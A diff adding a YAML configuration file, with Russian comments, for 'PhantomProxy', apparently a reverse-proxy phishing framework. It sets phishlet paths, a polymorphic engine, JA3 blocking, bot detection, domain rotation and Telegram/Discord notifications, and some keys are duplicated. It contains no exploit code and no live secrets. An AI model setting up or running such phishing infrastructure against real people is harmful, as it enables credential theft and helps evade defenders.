@@ -1,0 +1,73 @@
+# PhantomProxy Configuration File
+# Сохраните как config.yaml
+
+# Сеть
+bind_ip: "0.0.0.0"
+https_port: 443
+http3_port: 443
+http3_enabled: true
+
+# Домен и сертификаты
+domain: "phantom.local"
+auto_cert: false
+cert_path: "./certs/cert.pem"
+key_path: "./certs/key.pem"
+
+# База данных
+database_path: "./phantom.db"
+database_type: "sqlite"
+# postgres_url: "postgres://user:pass@localhost:5432/phantom"
+# redis_url: "redis://localhost:6379"
+
+# Phishlets
+phishlets_path: "./configs/phishlets"
+
+# Безопасность
+ja3_enabled: true
+ja3_blocklist: []
+ml_detection: false
+ml_threshold: 0.75
+blacklist_path: "./configs/blacklist.txt"
+whitelist_path: "./configs/whitelist.txt"
+
+# Polymorphic engine
+polymorphic_enabled: true
+polymorphic_level: "high"  # low, medium, high
+
+# Service Worker
+serviceworker_enabled: true
+
+# WebSocket
+websocket_enabled: true
+
+# Cloudflare Workers
+cloudflare_worker_enabled: false
+cloudflare_worker_url: ""
+cloudflare_worker_secret: ""
+
+# Уведомления
+telegram_enabled: false
+telegram_token: ""
+telegram_chat_id: 0
+
+discord_enabled: false
+discord_webhook_url: ""
+
+# ML Bot Detection
+ml_detection: false
+ml_threshold: 0.75
+
+# API
+api_enabled: true
+api_port: 8080
+api_key: "change-me-to-secure-random-string"
+
+# Логирование
+debug: false
+log_path: "./logs/phantom.log"
+log_level: "info"
+
+# Ротация доменов
+domain_rotation_enabled: false
+domain_rotation_interval: 60  # минут
+domains: []
